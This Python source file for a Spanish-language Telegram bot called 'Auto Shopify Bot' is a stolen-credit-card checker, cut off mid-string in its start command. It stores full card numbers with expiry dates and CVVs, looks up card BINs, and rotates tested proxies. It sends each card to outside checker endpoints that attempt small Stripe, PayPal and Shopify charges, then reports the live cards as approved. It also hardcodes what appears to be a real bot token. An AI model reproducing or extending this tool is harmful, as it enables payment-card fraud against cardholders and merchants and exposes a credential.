import telebot
from telebot import types
import requests
import sqlite3
import json
import time
import os
import re
import random
from datetime import datetime
from threading import Thread, Lock

# Configuración del bot - Usando variable de entorno para el token
TOKEN = os.environ.get('TOKEN', '8503937259:AAEApOgsbu34qw5J6OKz1dxgvRzrFv9IQdE')
bot = telebot.TeleBot(TOKEN)

# Lock para operaciones de base de datos (para hilos)
db_lock = Lock()

# ==================== FUNCIONES DE BASE DE DATOS ====================
# Cada función abre y cierra su propia conexión para evitar problemas de hilos

def get_db_connection():
    """Crea una nueva conexión a la base de datos"""
    conn = sqlite3.connect('proxies.db', timeout=10)
    conn.row_factory = sqlite3.Row
    return conn

def init_database():
    """Inicializa la base de datos con todas las tablas necesarias"""
    conn = get_db_connection()
    cursor = conn.cursor()
    
    # Tabla de proxies
    cursor.execute('''CREATE TABLE IF NOT EXISTS proxies (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        proxy TEXT UNIQUE,
        fecha TEXT,
        successes INTEGER DEFAULT 0,
        failures INTEGER DEFAULT 0,
        last_used TEXT,
        last_test TEXT,
        status TEXT DEFAULT 'untested'
    )''')
    
    # Tabla de historial
    cursor.execute('''CREATE TABLE IF NOT EXISTS historial (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        cc TEXT,
        proxy TEXT,
        gate TEXT,
        amount TEXT,
        status TEXT,
        message TEXT,
        gates TEXT,
        bin_info TEXT,
        fecha TEXT
    )''')
    
    # Tabla de tarjetas
    cursor.execute('''CREATE TABLE IF NOT EXISTS tarjetas (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        cc TEXT UNIQUE,
        fecha TEXT,
        veces_verificada INTEGER DEFAULT 0
    )''')
    
    # ========== NUEVA TABLA PARA SITIOS SHOPIFY ==========
    cursor.execute('''CREATE TABLE IF NOT EXISTS sitios (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        url TEXT UNIQUE,
        fecha TEXT,
        successes INTEGER DEFAULT 0,
        failures INTEGER DEFAULT 0,
        last_used TEXT
    )''')
    
    # Agregar columnas si no existen
    try:
        cursor.execute("ALTER TABLE proxies ADD COLUMN last_test TEXT")
        cursor.execute("ALTER TABLE proxies ADD COLUMN status TEXT DEFAULT 'untested'")
    except:
        pass
    
    try:
        cursor.execute("ALTER TABLE historial ADD COLUMN gate TEXT")
        cursor.execute("ALTER TABLE historial ADD COLUMN amount TEXT")
    except:
        pass
    
    try:
        cursor.execute("ALTER TABLE historial ADD COLUMN bin_info TEXT")
    except:
        pass
    
    conn.commit()
    conn.close()
    print("✅ Base de datos configurada correctamente")

# Inicializar BD
init_database()

# Cola de tareas masivas
active_tasks = {}

# ==================== FUNCIONES DE PROXIES ====================

def guardar_proxy(proxy):
    """Guarda un proxy en la base de datos"""
    conn = None
    try:
        conn = get_db_connection()
        cursor = conn.cursor()
        cursor.execute("INSERT INTO proxies (proxy, fecha) VALUES (?, ?)", 
                      (proxy, datetime.now().strftime("%Y-%m-%d %H:%M:%S")))
        conn.commit()
        return True
    except Exception as e:
        print(f"Error guardando proxy: {e}")
        return False
    finally:
        if conn:
            conn.close()

def guardar_proxies_desde_texto(texto):
    """Guarda proxies desde un archivo de texto"""
    lineas = texto.strip().split('\n')
    guardados = 0
    repetidos = 0
    invalidos = 0
    
    # Patrón para identificar proxies (ip:puerto o ip:puerto:user:pass)
    patron_proxy = re.compile(r'^(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}):(\d+)(?::([^:]+):([^:]+))?$')
    
    conn = get_db_connection()
    cursor = conn.cursor()
    
    for linea in lineas:
        linea = linea.strip()
        if not linea:
            continue
        
        # Verificar si es un proxy válido
        if patron_proxy.match(linea):
            try:
                cursor.execute("INSERT INTO proxies (proxy, fecha) VALUES (?, ?)",
                              (linea, datetime.now().strftime("%Y-%m-%d %H:%M:%S")))
                conn.commit()
                guardados += 1
            except:
                repetidos += 1
        else:
            invalidos += 1
    
    conn.close()
    return guardados, repetidos, invalidos

def obtener_proxies():
    """Obtiene todos los proxies"""
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute("SELECT proxy FROM proxies")
    proxies = [row[0] for row in cursor.fetchall()]
    conn.close()
    return proxies

def obtener_proxies_con_estadisticas():
    """Obtiene proxies con sus estadísticas"""
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute("SELECT proxy, successes, failures, last_test, status FROM proxies ORDER BY successes DESC, failures ASC")
    resultados = cursor.fetchall()
    conn.close()
    return resultados

def eliminar_proxy(proxy):
    """Elimina un proxy específico"""
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute("DELETE FROM proxies WHERE proxy = ?", (proxy,))
    conn.commit()
    filas = cursor.rowcount
    conn.close()
    return filas > 0

def eliminar_todos_proxies():
    """Elimina TODOS los proxies de la base de datos"""
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute("DELETE FROM proxies")
    conn.commit()
    filas = cursor.rowcount
    conn.close()
    return filas

def eliminar_proxies_muertos():
    """Elimina todos los proxies marcados como 'dead'"""
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute("DELETE FROM proxies WHERE status = 'dead'")
    conn.commit()
    filas = cursor.rowcount
    conn.close()
    return filas

def actualizar_estadisticas_proxy(proxy, success):
    """Actualiza estadísticas de un proxy"""
    conn = get_db_connection()
    cursor = conn.cursor()
    campo = "successes" if success else "failures"
    cursor.execute(f"UPDATE proxies SET {campo} = {campo} + 1, last_used = ? WHERE proxy = ?", 
                  (datetime.now().strftime("%Y-%m-%d %H:%M:%S"), proxy))
    conn.commit()
    conn.close()

def actualizar_status_proxy(proxy, status, tiempo):
    """Actualiza el status del proxy después del test"""
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute("UPDATE proxies SET status = ?, last_test = ? WHERE proxy = ?",
                  (status, datetime.now().strftime("%Y-%m-%d %H:%M:%S"), proxy))
    conn.commit()
    conn.close()

# ==================== NUEVAS FUNCIONES PARA SITIOS SHOPIFY ====================

def guardar_sitio(url):
    """Guarda un sitio Shopify en la base de datos"""
    conn = None
    try:
        conn = get_db_connection()
        cursor = conn.cursor()
        cursor.execute("INSERT INTO sitios (url, fecha) VALUES (?, ?)", 
                      (url, datetime.now().strftime("%Y-%m-%d %H:%M:%S")))
        conn.commit()
        return True
    except Exception as e:
        print(f"Error guardando sitio: {e}")
        return False
    finally:
        if conn:
            conn.close()

def guardar_sitios_desde_texto(texto):
    """Guarda sitios desde un archivo de texto"""
    lineas = texto.strip().split('\n')
    guardados = 0
    repetidos = 0
    invalidos = 0
    
    # Patrón para identificar URLs de Shopify
    patron_url = re.compile(r'^https?://[a-zA-Z0-9-]+\.myshopify\.com/?$')
    
    conn = get_db_connection()
    cursor = conn.cursor()
    
    for linea in lineas:
        linea = linea.strip()
        if not linea:
            continue
        
        # Verificar si es una URL válida de Shopify
        if patron_url.match(linea):
            try:
                cursor.execute("INSERT INTO sitios (url, fecha) VALUES (?, ?)",
                              (linea, datetime.now().strftime("%Y-%m-%d %H:%M:%S")))
                conn.commit()
                guardados += 1
            except:
                repetidos += 1
        else:
            invalidos += 1
    
    conn.close()
    return guardados, repetidos, invalidos

def obtener_sitios():
    """Obtiene todos los sitios Shopify"""
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute("SELECT url FROM sitios")
    sitios = [row[0] for row in cursor.fetchall()]
    conn.close()
    return sitios

def obtener_sitios_con_estadisticas():
    """Obtiene sitios con sus estadísticas"""
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute("SELECT url, successes, failures, last_used FROM sitios ORDER BY successes DESC, failures ASC")
    resultados = cursor.fetchall()
    conn.close()
    return resultados

def eliminar_sitio(url):
    """Elimina un sitio específico"""
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute("DELETE FROM sitios WHERE url = ?", (url,))
    conn.commit()
    filas = cursor.rowcount
    conn.close()
    return filas > 0

def eliminar_todos_sitios():
    """Elimina TODOS los sitios de la base de datos"""
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute("DELETE FROM sitios")
    conn.commit()
    filas = cursor.rowcount
    conn.close()
    return filas

def actualizar_estadisticas_sitio(url, success):
    """Actualiza estadísticas de un sitio"""
    conn = get_db_connection()
    cursor = conn.cursor()
    campo = "successes" if success else "failures"
    cursor.execute(f"UPDATE sitios SET {campo} = {campo} + 1, last_used = ? WHERE url = ?", 
                  (datetime.now().strftime("%Y-%m-%d %H:%M:%S"), url))
    conn.commit()
    conn.close()

# ==================== FUNCIONES DE TARJETAS ====================

def guardar_tarjetas_desde_texto(texto):
    """Guarda tarjetas desde un archivo de texto"""
    lineas = texto.strip().split('\n')
    guardadas = 0
    repetidas = 0
    invalidas = 0
    
    conn = get_db_connection()
    cursor = conn.cursor()
    
    for linea in lineas:
        linea = linea.strip()
        if not linea:
            continue
        partes = linea.split('|')
        if len(partes) == 4:
            try:
                cursor.execute("INSERT INTO tarjetas (cc, fecha) VALUES (?, ?)",
                              (linea, datetime.now().strftime("%Y-%m-%d %H:%M:%S")))
                conn.commit()
                guardadas += 1
            except:
                repetidas += 1
        else:
            invalidas += 1
    
    conn.close()
    return guardadas, repetidas, invalidas

def obtener_todas_tarjetas():
    """Obtiene todas las tarjetas"""
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute("SELECT cc, fecha, veces_verificada FROM tarjetas ORDER BY fecha DESC")
    resultados = cursor.fetchall()
    conn.close()
    return resultados

def aumentar_contador_tarjeta(cc):
    """Aumenta el contador de verificaciones de una tarjeta"""
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute("UPDATE tarjetas SET veces_verificada = veces_verificada + 1 WHERE cc = ?",
                  (cc,))
    conn.commit()
    conn.close()

def eliminar_tarjeta(cc):
    """Elimina una tarjeta específica"""
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute("DELETE FROM tarjetas WHERE cc = ?", (cc,))
    conn.commit()
    filas = cursor.rowcount
    conn.close()
    return filas > 0

def eliminar_todas_tarjetas():
    """Elimina TODAS las tarjetas"""
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute("DELETE FROM tarjetas")
    conn.commit()
    filas = cursor.rowcount
    conn.close()
    return filas

def guardar_historial(cc, proxy, gate, amount, status, message, gates, bin_info):
    """Guarda una verificación en el historial"""
    if isinstance(bin_info, dict):
        bin_info_str = json.dumps(bin_info)
    else:
        bin_info_str = bin_info
    
    conn = get_db_connection()
    cursor = conn.cursor()
    
    cursor.execute("INSERT INTO historial (cc, proxy, gate, amount, status, message, gates, bin_info, fecha) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)",
                  (cc, proxy, gate, amount, status, message, gates, bin_info_str, datetime.now().strftime("%Y-%m-%d %H:%M:%S")))
    conn.commit()
    conn.close()
    
    if proxy != 'gestionado':
        actualizar_estadisticas_proxy(proxy, status == 'success')
    
    aumentar_contador_tarjeta(cc)

def obtener_estadisticas():
    """Obtiene estadísticas globales"""
    conn = get_db_connection()
    cursor = conn.cursor()
    
    cursor.execute("SELECT COUNT(*), SUM(successes), SUM(failures) FROM proxies")
    stats_proxies = cursor.fetchone()
    
    cursor.execute("SELECT COUNT(*), SUM(successes), SUM(failures) FROM sitios")
    stats_sitios = cursor.fetchone()
    
    cursor.execute("SELECT COUNT(*) FROM tarjetas")
    total_tarjetas = cursor.fetchone()[0]
    
    cursor.execute("SELECT COUNT(*) FROM historial")
    total_checks = cursor.fetchone()[0]
    
    cursor.execute("SELECT COUNT(*) FROM historial WHERE status='success'")
    total_success = cursor.fetchone()[0]
    
    conn.close()
    
    return {
        'proxies': stats_proxies[0] or 0,
        'exits_proxy': stats_proxies[1] or 0,
        'fallos_proxy': stats_proxies[2] or 0,
        'sitios': stats_sitios[0] or 0,
        'exits_sitio': stats_sitios[1] or 0,
        'fallos_sitio': stats_sitios[2] or 0,
        'tarjetas': total_tarjetas or 0,
        'checks': total_checks or 0,
        'aprobadas': total_success or 0
    }

# ==================== FUNCIÓN DE CONSULTA BIN ====================

def consultar_bin(bin_number):
    """
    Consulta información de BIN usando binlist.net
    """
    try:
        bin_number = bin_number[:6]
        
        url = f"https://lookup.binlist.net/{bin_number}"
        headers = {
            'Accept-Version': '3',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }
        
        response = requests.get(url, headers=headers, timeout=5)
        
        if response.status_code == 200:
            return response.json()
        elif response.status_code == 404:
            return {"error": "BIN no encontrado", "bin": bin_number}
        elif response.status_code == 429:
            return {"error": "Límite de peticiones excedido", "bin": bin_number}
        else:
            return {"error": f"Error {response.status_code}", "bin": bin_number}
            
    except Exception as e:
        return {"error": str(e), "bin": bin_number}

# ==================== FUNCIÓN DE VERIFICACIÓN STRIPE $1 ====================

def verificar_api_stripe(cc, proxy=None):
    """
    Verifica usando Stripe (endpoint /api/check3) - $1.00
    """
    try:
        api_url = f"https://samurai-api-hub.up.railway.app/api/check3?c={cc}"
        if proxy:
            api_url += f"&p={proxy}"
        
        start_time = time.time()
        response = requests.get(api_url, timeout=30)
        elapsed = time.time() - start_time
        
        try:
            data = response.json()
            status = data.get('status', 'unknown')
            message = data.get('message', 'Sin mensaje')
            gates = data.get('gates', 'stripe 1.00$ charged')
            amount = data.get('amount', '1.00')
            
            return {
                'success': status == 'success',
                'status': status,
                'message': message,
                'gates': gates,
                'gate_name': 'Stripe $1.00',
                'amount': amount,
                'proxy': proxy if proxy else 'gestionado',
                'tiempo': elapsed
            }
            
        except json.JSONDecodeError:
            return {
                'success': False,
                'status': 'error',
                'message': f'HTTP {response.status_code}',
                'gates': 'stripe error',
                'gate_name': 'Stripe $1.00',
                'amount': '1.00',
                'proxy': proxy if proxy else 'gestionado',
                'tiempo': elapsed
            }
            
    except Exception as e:
        return {
            'success': False,
            'status': 'error',
            'message': str(e),
            'gates': 'stripe error',
            'gate_name': 'Stripe $1.00',
            'amount': '1.00',
            'proxy': proxy if proxy else 'gestionado',
            'tiempo': 30
        }

# ==================== NUEVA FUNCIÓN DE VERIFICACIÓN STRIPE $1.34 ====================

def verificar_api_stripe_134(cc, proxy=None):
    """
    Verifica usando Stripe $1.34 (endpoint /api/check2) - Gate 2 de Samurai ApiHub
    """
    try:
        api_url = f"https://samurai-api-hub.up.railway.app/api/check2?c={cc}"
        if proxy:
            api_url += f"&p={proxy}"
        
        start_time = time.time()
        response = requests.get(api_url, timeout=30)
        elapsed = time.time() - start_time
        
        try:
            data = response.json()
            status = data.get('status', 'unknown')
            message = data.get('message', 'Sin mensaje')
            gates = data.get('gates', 'stripe 1.34$ charged')
            amount = data.get('amount', '1.34')
            
            return {
                'success': status == 'success',
                'status': status,
                'message': message,
                'gates': gates,
                'gate_name': 'Stripe $1.34',
                'amount': amount,
                'proxy': proxy if proxy else 'gestionado',
                'tiempo': elapsed
            }
            
        except json.JSONDecodeError:
            return {
                'success': False,
                'status': 'error',
                'message': f'HTTP {response.status_code}',
                'gates': 'stripe error',
                'gate_name': 'Stripe $1.34',
                'amount': '1.34',
                'proxy': proxy if proxy else 'gestionado',
                'tiempo': elapsed
            }
            
    except Exception as e:
        return {
            'success': False,
            'status': 'error',
            'message': str(e),
            'gates': 'stripe error',
            'gate_name': 'Stripe $1.34',
            'amount': '1.34',
            'proxy': proxy if proxy else 'gestionado',
            'tiempo': 30
        }

# ==================== FUNCIONES DE VERIFICACIÓN PAYPAL ====================

def verificar_api_paypal(cc, gate=1, proxy=None):
    """
    Verifica usando PayPal con diferentes montos
    gate 1: /pp/check  - $10.00
    gate 2: /pp/check2 - $0.10
    gate 3: /pp/check3 - $1.00
    """
    gates = {
        1: {"endpoint": "/pp/check", "amount": "10.00", "name": "PayPal $10"},
        2: {"endpoint": "/pp/check2", "amount": "0.10", "name": "PayPal $0.10"},
        3: {"endpoint": "/pp/check3", "amount": "1.00", "name": "PayPal $1"}
    }
    
    gate_info = gates.get(gate, gates[1])
    
    try:
        api_url = f"https://samurai-api-hub.up.railway.app{gate_info['endpoint']}?c={cc}"
        if proxy:
            api_url += f"&p={proxy}"
        
        start_time = time.time()
        response = requests.get(api_url, timeout=30)
        elapsed = time.time() - start_time
        
        try:
            data = response.json()
            status = data.get('status', 'unknown')
            message = data.get('message', 'Sin mensaje')
            gates_str = f"paypal {gate_info['amount']}$ charged"
            
            return {
                'success': status == 'success',
                'status': status,
                'message': message,
                'gates': gates_str,
                'gate_name': gate_info['name'],
                'amount': gate_info['amount'],
                'proxy': proxy if proxy else 'gestionado',
                'tiempo': elapsed
            }
            
        except json.JSONDecodeError:
            return {
                'success': False,
                'status': 'error',
                'message': f'HTTP {response.status_code}',
                'gates': 'paypal error',
                'gate_name': gate_info['name'],
                'amount': gate_info['amount'],
                'proxy': proxy if proxy else 'gestionado',
                'tiempo': elapsed
            }
            
    except Exception as e:
        return {
            'success': False,
            'status': 'error',
            'message': str(e),
            'gates': 'paypal error',
            'gate_name': gate_info['name'],
            'amount': gate_info['amount'],
            'proxy': proxy if proxy else 'gestionado',
            'tiempo': 30
        }

# ==================== FUNCIÓN DE VERIFICACIÓN AUTOSHOPIFY ====================

def verificar_api_autoshopify(cc, url, proxy=None):
    """
    Verifica usando AutoShopify (endpoint shopi.php)
    """
    try:
        api_url = f"http://dev-kamal.pw/shopi.php?cc={cc}&url={url}"
        if proxy:
            api_url += f"&proxy={proxy}"
        
        start_time = time.time()
        response = requests.get(api_url, timeout=30)
        elapsed = time.time() - start_time
        
        try:
            data = response.json()
            response_text = data.get('Response', 'Unknown')
            price = data.get('Price', '0.00')
            gate = data.get('Gate', 'Shopify')
            
            # Determinar si es éxito
            is_success = 'Order completed' in response_text
            
            return {
                'success': is_success,
                'status': 'success' if is_success else 'failed',
                'message': response_text,
                'gates': f"Shopify ${price}",
                'gate_name': f"AutoShopify ${price}",
                'amount': price,
                'url': url,
                'proxy': proxy if proxy else 'gestionado',
                'tiempo': elapsed
            }
            
        except json.JSONDecodeError:
            return {
                'success': False,
                'status': 'error',
                'message': f'HTTP {response.status_code} - {response.text[:100]}',
                'gates': 'shopify error',
                'gate_name': 'AutoShopify',
                'amount': '0.00',
                'url': url,
                'proxy': proxy if proxy else 'gestionado',
                'tiempo': elapsed
            }
            
    except Exception as e:
        return {
            'success': False,
            'status': 'error',
            'message': str(e),
            'gates': 'shopify error',
            'gate_name': 'AutoShopify',
            'amount': '0.00',
            'url': url,
            'proxy': proxy if proxy else 'gestionado',
            'tiempo': 30
        }

# ==================== FORMATO PREMIUM PARA RESULTADOS ====================

def formato_check_premium(cc, resultado_api, bin_info, tiempo, user_name="User", gate_type="Stripe"):
    """
    Formato premium con diseño tipo checker profesional
    """
    # Determinar estado de la verificación
    if resultado_api['status'] == 'success':
        estado_verif = "𝐀𝐏𝐏𝐑𝐎𝐕𝐄𝐃 ✅"
        color_estado = "✅"
    elif resultado_api['status'] == 'failed':
        estado_verif = "𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌"
        color_estado = "❌"
    elif resultado_api['status'] == 'error':
        estado_verif = "𝐄𝐫𝐫𝐨𝐫 ⚠️"
        color_estado = "⚠️"
    else:
        estado_verif = "𝐔𝐧𝐤𝐧𝐨𝐰𝐧 ❓"
        color_estado = "❓"
    
    # Extraer datos de la tarjeta
    partes = cc.split('|')
    numero = partes[0]
    mes = partes[1]
    año = partes[2]
    cvv = partes[3]
    bin_num = numero[:6]
    
    # Extraer información del BIN
    if bin_info and isinstance(bin_info, dict) and 'error' not in bin_info:
        scheme = bin_info.get('scheme', 'UNKNOWN').upper()
        card_type = bin_info.get('type', 'UNKNOWN').upper()
        
        # Datos del país
        country_info = bin_info.get('country', {})
        country_name = country_info.get('name', 'Unknown')
        country_emoji = country_info.get('emoji', '🌍')
        
        # Datos del banco
        bank_info = bin_info.get('bank', {})
        bank_name = bank_info.get('name', 'Unknown')
        
        # Determinar tipo de tarjeta completo
        if scheme == "VISA":
            tipo_completo = "VISA"
        elif scheme == "MASTERCARD":
            tipo_completo = "MASTERCARD"
        elif scheme == "AMEX":
            tipo_completo = "AMERICAN EXPRESS"
        elif scheme == "DISCOVER":
            tipo_completo = "DISCOVER"
        elif scheme == "JCB":
            tipo_completo = "JCB"
        else:
            tipo_completo = scheme
        
        # Tipo específico (debit/credit)
        tipo_especifico = card_type.capitalize() if card_type else "UNKNOWN"
        
        # Información de país formateada
        country_line = f"{country_name} {country_emoji}"
    else:
        tipo_completo = "UNKNOWN"
        tipo_especifico = "UNKNOWN"
        country_line = "Unknown 🌍"
        bank_name = "Unknown"
    
    # Status del proxy
    if resultado_api['proxy'] == 'gestionado':
        proxy_status = "API 🌐"
    else:
        proxy_status = "Live ✨"
    
    # Formatear tiempo
    if tiempo < 60:
        tiempo_str = f"{tiempo:.2f}s"
    else:
        minutos = int(tiempo // 60)
        segundos = int(tiempo % 60)
        tiempo_str = f"{minutos}m {segundos}s"
    
    # Limpiar mensaje de estado
    status_msg = resultado_api['message']
    
    # Construir el mensaje premium
    texto = f"""
{color_estado} {estado_verif}
━━━━━━━━━━━━━━━━━━━━━━
[ϟ] 𝗖𝗖 : {numero}|{mes}|{año}|{cvv}
[ϟ] 𝗚𝗮𝘁𝗲 : {resultado_api['gate_name']}
[ϟ] 𝗦𝘁𝗮𝘁𝘂𝘀 : {status_msg[:40]}
━━━━━━━━━━━━━━━━━━━━━━
[ϟ] 𝗕𝗶𝗻 : {bin_num}
[ϟ] 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 : {country_line}
[ϟ] 𝗕𝗮𝗻𝗸 : {bank_name[:30]}
[ϟ] 𝗧𝘆𝗽𝗲 : {tipo_completo} | {tipo_especifico}
━━━━━━━━━━━━━━━━━━━━━━
[ϟ] T/t : {tiempo_str} | Proxy : {proxy_status}
[ϟ] 𝗖𝗵𝗲𝗸𝗲𝗱 𝗯𝘆 : @AutoShopifyBot
[ϟ] 𝗢𝘄𝗻𝗲𝗿 : {user_name}
╚━━━━「𝐀𝐔𝐓𝐎 𝐒𝐇𝐎𝐏𝐈𝐅𝐘 𝐁𝐎𝐓」━━━━╝
"""
    return texto

# ==================== COMANDO PARA TESTEAR PROXIES ====================

@bot.message_handler(commands=['px'])
def cmd_test_proxies(message):
    """Testea todos los proxies guardados"""
    
    proxies = obtener_proxies()
    
    if not proxies:
        bot.reply_to(message, "📭 No hay proxies guardados para testear")
        return
    
    msg = bot.reply_to(message, f"🔄 Testeando {len(proxies)} proxies...\nEsto puede tomar unos segundos")
    
    resultados = {
        'vivos': [],
        'lentos': [],
        'muertos': []
    }
    
    for i, proxy in enumerate(proxies, 1):
        try:
            # Probar conexión con timeout de 5 segundos
            start_time = time.time()
            
            # Formatear proxy para requests
            partes = proxy.split(':')
            if len(partes) == 4:
                ip, puerto, user, passw = partes
                proxy_dict = {
                    'http': f'http://{user}:{passw}@{ip}:{puerto}',
                    'https': f'https://{user}:{passw}@{ip}:{puerto}'
                }
            else:
                proxy_dict = {
                    'http': f'http://{proxy}',
                    'https': f'https://{proxy}'
                }
            
            # Probar con httpbin.org
            response = requests.get(
                'http://httpbin.org/ip',
                proxies=proxy_dict,
                timeout=5
            )
            
            elapsed = time.time() - start_time
            
            if response.status_code == 200:
                if elapsed < 2:
                    resultados['vivos'].append((proxy, f"{elapsed:.2f}s"))
                    actualizar_status_proxy(proxy, 'alive', f"{elapsed:.2f}s")
                else:
                    resultados['lentos'].append((proxy, f"{elapsed:.2f}s"))
                    actualizar_status_proxy(proxy, 'slow', f"{elapsed:.2f}s")
            else:
                resultados['muertos'].append((proxy, f"HTTP {response.status_code}"))
                actualizar_status_proxy(proxy, 'dead', f"HTTP {response.status_code}")
                
        except requests.exceptions.ConnectTimeout:
            resultados['muertos'].append((proxy, "Timeout"))
            actualizar_status_proxy(proxy, 'dead', "Timeout")
        except requests.exceptions.ProxyError:
            resultados['muertos'].append((proxy, "Proxy Error"))
            actualizar_status_proxy(proxy, 'dead', "Proxy Error")
        except Exception as e:
            resultados['muertos'].append((proxy, str(e)[:20]))
            actualizar_status_proxy(proxy, 'dead', str(e)[:20])
        
        # Actualizar progreso cada 5 proxies
        if i % 5 == 0 or i == len(proxies):
            try:
                bot.edit_message_text(
                    f"🔄 Testeando proxies... {i}/{len(proxies)}",
                    message.chat.id,
                    msg.message_id
                )
            except:
                pass
    
    # Generar archivo de resultados
    filename = f"proxy_test_{datetime.now().strftime('%Y%m%d%H%M%S')}.txt"
    with open(filename, 'w', encoding='utf-8') as f:
        f.write("RESULTADOS TEST DE PROXIES\n")
        f.write("━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n")
        f.write(f"Fecha: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
        f.write(f"Total proxies: {len(proxies)}\n")
        f.write("━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n")
        
        f.write(f"✅ VIVOS (<2s) ({len(resultados['vivos'])}):\n")
        for proxy, tiempo in resultados['vivos']:
            f.write(f"  • {proxy} - {tiempo}\n")
        
        f.write(f"\n🐢 LENTOS (>2s) ({len(resultados['lentos'])}):\n")
        for proxy, tiempo in resultados['lentos']:
            f.write(f"  • {proxy} - {tiempo}\n")
        
        f.write(f"\n❌ MUERTOS ({len(resultados['muertos'])}):\n")
        for proxy, error in resultados['muertos']:
            f.write(f"  • {proxy} - {error}\n")
    
    # Crear mensaje de resumen
    texto = f"""✅ TEST DE PROXIES COMPLETADO
━━━━━━━━━━━━━━━━━━━━━━
📊 RESULTADOS:

✅ Vivos: {len(resultados['vivos'])}
🐢 Lentos: {len(resultados['lentos'])}
❌ Muertos: {len(resultados['muertos'])}
━━━━━━━━━━━━━━━━━━━━━━

📁 Se generó archivo con detalles
💡 Usa /proxies para ver el estado actualizado"""

    try:
        bot.edit_message_text(texto, message.chat.id, msg.message_id)
    except:
        bot.send_message(message.chat.id, texto)
    
    # Enviar archivo
    with open(filename, 'rb') as f:
        bot.send_document(
            message.chat.id, 
            f, 
            caption=f"📊 Test de proxies - {len(proxies)} proxies"
        )
    
    os.remove(filename)

# ==================== MENÚS Y BOTONES ====================

def menu_principal():
    markup = types.InlineKeyboardMarkup(row_width=2)
    btn1 = types.InlineKeyboardButton("💳 Tarjetas", callback_data='menu_tarjetas')
    btn2 = types.InlineKeyboardButton("🌐 Proxies", callback_data='menu_proxies')
    btn3 = types.InlineKeyboardButton("💵 Stripe $1", callback_data='menu_stripe')
    btn4 = types.InlineKeyboardButton("💰 Stripe $1.34", callback_data='menu_stripe_134')
    btn5 = types.InlineKeyboardButton("💰 PayPal", callback_data='menu_paypal')
    btn6 = types.InlineKeyboardButton("🛍️ AutoShopify", callback_data='menu_shopify')
    btn7 = types.InlineKeyboardButton("📊 Estadísticas", callback_data='menu_stats')
    btn8 = types.InlineKeyboardButton("📁 Cargar archivo", callback_data='menu_cargar')
    markup.add(btn1, btn2, btn3, btn4, btn5, btn6, btn7, btn8)
    return markup

def menu_tarjetas():
    markup = types.InlineKeyboardMarkup(row_width=2)
    btn1 = types.InlineKeyboardButton("📋 Listar tarjetas", callback_data='listar_tarjetas')
    btn2 = types.InlineKeyboardButton("🗑️ Eliminar tarjeta", callback_data='eliminar_tarjeta')
    btn3 = types.InlineKeyboardButton("🧹 Limpiar todas", callback_data='limpiar_tarjetas')
    btn4 = types.InlineKeyboardButton("🔙 Volver", callback_data='volver_principal')
    markup.add(btn1, btn2, btn3, btn4)
    return markup

def menu_proxies():
    markup = types.InlineKeyboardMarkup(row_width=2)
    btn1 = types.InlineKeyboardButton("➕ Añadir proxy", callback_data='add_proxy')
    btn2 = types.InlineKeyboardButton("📋 Listar proxies", callback_data='listar_proxies')
    btn3 = types.InlineKeyboardButton("🗑️ Eliminar proxy", callback_data='del_proxy')
    btn4 = types.InlineKeyboardButton("🗑️ Eliminar TODOS", callback_data='del_all_proxies')
    btn5 = types.InlineKeyboardButton("🧹 Limpiar muertos", callback_data='clean_dead')
    btn6 = types.InlineKeyboardButton("🔍 Testear proxies", callback_data='test_proxies')
    btn7 = types.InlineKeyboardButton("🔙 Volver", callback_data='volver_principal')
    markup.add(btn1, btn2, btn3, btn4, btn5, btn6, btn7)
    return markup

def menu_paypal():
    markup = types.InlineKeyboardMarkup(row_width=2)
    btn1 = types.InlineKeyboardButton("💰 PayPal $10", callback_data='paypal_10')
    btn2 = types.InlineKeyboardButton("🪙 PayPal $0.10", callback_data='paypal_01')
    btn3 = types.InlineKeyboardButton("💎 PayPal $1", callback_data='paypal_1')
    btn4 = types.InlineKeyboardButton("🔙 Volver", callback_data='volver_principal')
    markup.add(btn1, btn2, btn3, btn4)
    return markup

def menu_shopify():
    markup = types.InlineKeyboardMarkup(row_width=2)
    btn1 = types.InlineKeyboardButton("➕ Añadir sitio", callback_data='add_sitio')
    btn2 = types.InlineKeyboardButton("📋 Listar sitios", callback_data='listar_sitios')
    btn3 = types.InlineKeyboardButton("🗑️ Eliminar sitio", callback_data='del_sitio')
    btn4 = types.InlineKeyboardButton("🗑️ Eliminar TODOS", callback_data='del_all_sitios')
    btn5 = types.InlineKeyboardButton("🔍 Verificar una", callback_data='shopify_individual')
    btn6 = types.InlineKeyboardButton("📦 Verificar masivo", callback_data='shopify_masivo')
    btn7 = types.InlineKeyboardButton("🔙 Volver", callback_data='volver_principal')
    markup.add(btn1, btn2, btn3, btn4, btn5, btn6, btn7)
    return markup

# ==================== COMANDOS PRINCIPALES ====================

@bot.message_handler(commands=['start', 'menu'])
def cmd_menu(message):
    texto = (
        "╔════════════════════════════╗\n"
        "║    🚀  AUTO SHOPIFY BOT    ║\n"
        "╠════════════════════════════╣\n"
        "║  Gates disponibles:         ║\n"
        "║  • Stripe: $1.00            ║\n"
        "║  • Stripe: $1.34 (NUEVO)    ║\n"
